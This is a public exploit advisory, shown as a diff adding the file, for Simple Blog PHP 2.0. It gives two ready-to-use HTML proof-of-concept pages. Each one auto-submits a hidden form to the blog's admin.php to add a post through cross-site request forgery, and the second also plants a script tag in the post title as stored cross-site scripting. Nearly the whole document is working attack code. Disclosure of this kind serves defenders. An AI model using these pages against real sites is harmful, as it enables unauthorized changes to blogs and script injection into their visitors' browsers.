@@ -1,0 +1,50 @@
+=====================================================
+# Simple Blog PHP 2.0 - CSRF(Add Post) // Stored XSS
+=====================================================
+# Vendor Homepage: http://simpleblogphp.com/
+# Date: 13 Oct 2016
+# Demo Link : http://simpleblogphp.com/blog/admin.php
+# Version : 2.0
+# Platform : PHP
+# Author: Ashiyane Digital Security Team
+# Contact: hehsan979@gmail.com
+=====================================================
+# CSRF PoC(Add Post):
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="http://localhost/blog/admin.php" method="POST">
+      <input type="hidden" name="act" value="addPost" />
+      <input type="hidden" name="publish_date" value="2016-10-13 10:30:27" />
+      <input type="hidden" name="post_title" value="Hacked" />
+      <input type="hidden" name="post_text" value="Hacked" />
+      <input type="hidden" name="post_limit" value="550" />
+	   <input type="submit" value="Submit request" />
+    </form>
+    <script>
+		document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+# Stored XSS PoC:
+<html>
+  <!-- CSRF + XSS Stored PoC -->
+  <body>
+    <form action="http://localhost/blog/admin.php" method="POST">
+      <input type="hidden" name="act" value="addPost" />
+      <input type="hidden" name="publish_date" value="2016-10-13 10:30:27" />
+      <input type="hidden" name="post_title" value="<script>alert('XssPoC')</script>" />
+      <input type="hidden" name="post_text" value="Hacked" />
+      <input type="hidden" name="post_limit" value="550" />
+	   <input type="submit" value="Submit request" />
+    </form>
+    <script>
+		document.forms[0].submit();
+    </script>
+  </body>
+</html>
+================================================================================
+# Discovered By : Ehsan Hosseini
+================================================================================
